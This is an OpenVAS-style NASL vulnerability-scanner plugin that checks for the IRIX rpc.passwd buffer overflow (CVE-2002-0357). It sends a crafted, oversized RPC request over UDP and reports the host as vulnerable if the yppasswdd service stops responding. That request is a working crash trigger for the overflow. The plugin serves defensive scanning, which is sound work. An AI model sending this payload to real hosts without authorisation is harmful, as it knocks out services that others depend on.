if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80034" );
	script_version( "2021-04-14T09:28:27+0000" );
	script_tag( name: "last_modification", value: "2021-04-14 09:28:27 +0000 (Wed, 14 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)" );
	script_bugtraq_id( 4939 );
	script_cve_id( "CVE-2002-0357" );
	script_xref( name: "OSVDB", value: "834" );
	script_tag( name: "cvss_base", value: "7.2" );
	script_tag( name: "cvss_base_vector", value: "AV:L/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "irix rpc.passwd overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2008 Renaud Deraison" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "secpod_rpc_portmap_udp.sc", "yppasswdd.sc" );
	script_mandatory_keys( "rpc/portmap/udp/detected" );
	script_exclude_keys( "rpc/yppasswd/sun_overflow" );
	script_tag( name: "solution", value: "Disable this service if you don't use
  it, or see SGI advisory #20020601-01-P." );
	script_tag( name: "summary", value: "The remote RPC service 100009 (yppasswdd) is vulnerable
  to a buffer overflow which allows any user to obtain a root shell on this host." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("rpc.inc.sc");
require("byte_func.inc.sc");
n = get_kb_item( "rpc/yppasswd/sun_overflow" );
if(n){
	exit( 0 );
}
func ping( len, soc ){
	crp = crap( len - 4 );
	len_hi = len / 256;
	len_lo = len % 256;
	req = raw_string( 0x56, 0x6C, 0x9F, 0x6B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, len_hi, len_lo, 0x80, 0x1C, 0x40, 0x11 ) + crp + raw_string( 0x00, 0x00, 0x00, 0x02, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03, 0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02, 0x61, 0x61, 0x00, 0x00 );
	send( socket: soc, data: req );
	r = recv( socket: soc, length: 28 );
	if( strlen( r ) > 1 ) {
		return ( 1 );
	}
	else {
		return ( 0 );
	}
}
port = rpc_get_port( program: 100009, protocol: IPPROTO_UDP );
if(!port){
	exit( 0 );
}
if(!get_udp_port_state( port )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
p1 = ping( len: 80, soc: soc );
if(p1){
	p2 = ping( len: 4000, soc: soc );
	if(!p2){
		p3 = ping( len: 80, soc: soc );
		if(!p3){
			security_message( port: port, protocol: "udp" );
		}
	}
}
close( soc );
exit( 0 );

